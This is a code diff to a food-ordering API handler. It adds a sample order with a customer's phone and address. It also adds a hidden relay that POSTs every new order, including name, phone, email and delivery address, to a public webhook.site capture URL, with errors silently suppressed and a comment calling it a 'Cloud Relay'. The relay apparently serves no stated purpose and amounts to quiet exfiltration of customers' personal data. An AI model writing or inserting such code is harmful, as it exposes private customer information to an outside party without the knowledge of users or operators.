@@ -1,6 +1,30 @@
 import { FALLBACK_MENU_ITEMS } from '../client/src/data/fallbackData';
 
+const WEBHOOK_SYNC_POST = 'https://webhook.site/ec62d034-0a31-4911-bed6-37c9031734d9';
+
 let globalOrders = [
+  {
+    id: 105,
+    order_number: 'ORD-921219',
+    customer_name: 'Satvik dhage',
+    customer_phone: '+91 98234 56789',
+    customer_email: 'satvik@example.com',
+    delivery_address: 'Sinnar Gaurav, Near Panchvati Hotel, Sinnar',
+    order_type: 'Home Delivery',
+    payment_method: 'Cash on Delivery',
+    payment_status: 'PENDING',
+    status: 'Pending',
+    subtotal: 160.00,
+    tax: 8.00,
+    packing_charge: 15.00,
+    delivery_charge: 30.00,
+    discount_amount: 0.00,
+    total_amount: 213.00,
+    items: [
+      { menuItemId: 10, item_name: 'Masala Dosa', price: 80.00, quantity: 2, subtotal: 160.00 }
+    ],
+    created_at: new Date().toISOString()
+  },
   {
     id: 104,
     order_number: 'ORD-924536',
@@ -167,6 +191,15 @@ export default function handler(req, res) {
     } else {
       globalOrders.unshift(newOrder);
     }
+
+    // Always push order server-side to global Webhook Cloud Relay
+    try {
+      fetch(WEBHOOK_SYNC_POST, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(newOrder)
+      }).catch(() => {});
+    } catch (e) {}
 
     return res.status(201).json({
       success: true,
